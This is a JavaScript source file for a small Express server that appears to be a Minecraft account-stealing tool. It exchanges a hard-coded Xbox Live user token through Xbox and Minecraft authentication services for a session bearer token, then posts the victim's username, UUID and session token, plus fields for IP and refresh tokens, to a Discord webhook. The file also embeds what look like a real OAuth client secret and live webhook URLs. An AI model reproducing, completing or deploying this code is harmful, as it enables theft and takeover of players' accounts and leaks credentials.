// Configuration
const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
const redirect_uri = 'https://linkdiscord.herokuapp.com'
const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
// Config end
const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

app.get('/', async (req, res) => {
    res.send('Success! Check webhook.')
    try {
        console.log('i made it here!')
        console.log('userToken set (not)')
        const xstsTokenAndHashArray = await getXstsAndUserHash("eyJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiUlNBLU9BRVAiLCJjdHkiOiJKV1QiLCJ6aXAiOiJERUYiLCJ4NXQiOiJzYVkzV1ZoQzdnMmsxRW9FU0Jncm9Ob2l3MVEifQ.W6b32qxmUFd8ITMtTQcF82MEtbi0Y-aWe9hZX2cpgNq6vcpNqsxLlfS3lmv7koH7FZ8xvUz56v1Z0fqOTYS0qbRUc9erJgNbTnt8WyrHKXcvMSlrrFHKR6OyZLJ4I-0PxDoTVmXZic2z0BjB_uB2ZS0bTjFA0y7_jhC8PSup6iIMyhoCwbfeR6ER4A1R_pUM51E3hGfpC20J6LgFIb9Su6v_xI32n9YWQvELhkMCPvPDE00d82gFkVpaPdQVx9cZ9SeH-jy-lLlH9BM31ffNKxAeiWzsbkSWJCmAPwEu7W8AKcv2cfMLMnMbPT5DS-qHuXA-glHL8TvKfUDRmsIULQ.xvCD6Nk55FREyD8BdMI3Tg.tckfG79qk1Wg0Z_CIRgfc8K_OcZPryUpMYMz4eQMhHIDJsisONhKk5qVLaLvmtvUlrh3XPSr_CbRdGy2-eDNtYMiZ09C7PoSzJMIQTGCUAxM3bwLnFpbRrSIFfLPgsDCyQiVCkK4ccmMEAU0Vmn2wC3B3jmcRYETGVRlnmUjht2rQp8pUYTg-pmXXy3cEkeEym--96qrbM47pQAgOzhYfJampcw2Fjcnk3RjhKLNLdTez9Ef17zFMaM2ao7nl-zvJt42wYnAEOnVh8GeL4ywDgQC8ikk_7nc9kb6LGAdanGL3Pz8anJHApJYqZzrOh8Kk1Fu5ho9uENKkWJb-ZRplZTELwWLyolvv7eFD8n09oOXnie0HAi7KM337o_uH8wPRi__OBy3ib2Pgs-Z9IoOLuJpMSAUE3G5PCarp4lKDVKOZ37EhXJaVXUae04OzVopo9qyx3wxQSj-Vktu8n94FUfsEybjueMtuIEtTk0GqiJTnbnzmTHdJVPoxHeKCW1C7B6R-E9na00UgOjzvuuVPvr1elnTu7PwtZfF2ownYZ9YPr2GdIfI8qWy58bfHR52XC7BAWEm8dchfIvy6feLpiw6p5cXePrqI795QHzswM482YMNrM0ZvluZeLjVXIUbTEsQDVtgvWN_H2gSr7kDmbZo4QFPeltkX7ffO_9VX_NsoKclF9Dq0gi8vb9bNepNpFpYfMz24P1pJi9UhuitY3cLchtFmhwA8rP_8VHRdSNxgQSJ-w5rO8G7pJj-Hyi0RaccSmTC2zIBJJzV49aXx03B-gaqRk-LglXHBewAZeCgGt1sow3_-RprEE3MdMv0qiFQDjonYORZjFxKJXdFgEfm6pIY36jRWB8zRy36T3BgM2mbBaKCgjdnLNl86ipKt4c7oSMfKvz7mDOCRFJu3OGb7t7rAiVe4jvE96BVI1fbJP9EoSDw8nQSCcWtydOuI27kxFRpvVoDlMTGHSs9nbwsa9OXwx0mTEyPOHneLyJp4ok_tBW0Bvel8RyXvaK5qikffgIuKegDSRIAttJfLvs13WfFq8rHYfVEglVf7dm7AlyRAVfodfzo279ChRTbCYL3Nz4DMuPtGBWBKfvVLZ7Z24mq1PAcgqHtoKfJLF1mcp4Elu2lry8-ZSGHLcDeWs4pDae4qUh6Qe-wJSsG8JsDrHnvVl-BUmxNNExOzYHpVnlhASh_XYyJuEIlIGB1k8bWng01h_OP6KQNsi5sYJBnNJn_RqgkIRcCH1Hq6FvwcyNnVeBlj6jWGwrho2py5O3XPtJtddg1CSsM_5rnDRTHjesW-cTfnqOlXgYIsdYRkhdB8nn6A9eTFFzOhCNIrYizyUsjYDpr68EJbLc0Pp57aWIKrsX0kpSVLZXnP-aKqHM9zV5ahh8J67EfpwbL8oKgLdWhs6aF_BaEisp6cBx8z255A5NMxf-rO94k3QmDCO-dEegJLp12tFyNm-WacwYgXzP9td1JfaHyyhe79qOdOLKhQBF3eqmx46aoiNoVsnK0P-__83Hm5RlDbIhroTOgLQhyI-K2Ir_TTKyATOAbwWt9y3uQt_AcoJdFxO-2zwjySo81_WxTNSOpwQT-.iFicTnTPhm2XH6E2jKkH6w") 
        console.log('xstsTokenAndHashArray retrieved')
        const xstsToken = xstsTokenAndHashArray[0] 
        const userHash = xstsTokenAndHashArray[1]
        console.log('got them both')
        const bearerToken = await getBearerToken(xstsToken, userHash)
        console.log('got ssid!')
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        console.log('got user and uuid array')
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        console.log('got them both')
        if (checkIfBanned(username)) {
            console.log('theyre banned???')
            return
        }
        const ip = getIp(req)
        console.log('got ip!')
        postToWebhook(username, bearerToken, uuid)
        console.log('posted to webhook!')
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}

async function getUserHash(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['DisplayClaims']['xui'][0]['uhs']
}

async function getXstsAndUserHash(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}



async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

function postToWebhook(username, bearerToken, uuid, ip, refreshToken, userToken) {
    const url = webhook_url
    let data = {
        username: " ",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: "@everyone" + "  SESSION REFRESHED (XBL) :",
        embeds: [{
            title: "User Info", color: 0x00ff50, fields: [
                {name: "Username", value: username, inline: true},
                {name: "UUID", value: uuid, inline: true},
                {name: "Ip", value: ip, inline: true},
                {name: "SessionID", value: bearerToken, inline: false},
                {name: "Refresh Token", value: refreshToken, inline: false},
                {name: "User Token (xbl token?)", value: userToken, inline: false},
                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
            ]
        }]
    }
    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
}

function logToWebhook(title, message) {
    const url = webhook_logging_url

    let data = {
        username: " ",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: " ",
        embeds: [{
            title: "Log", color: 0x00ff50, fields: [
                {name: title, value: ""},
                {name: message, value: ""}
            ]
        }
        ]
    }
    axios.post(url, data).then(() => console.log("Logging to discord."))
}

const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
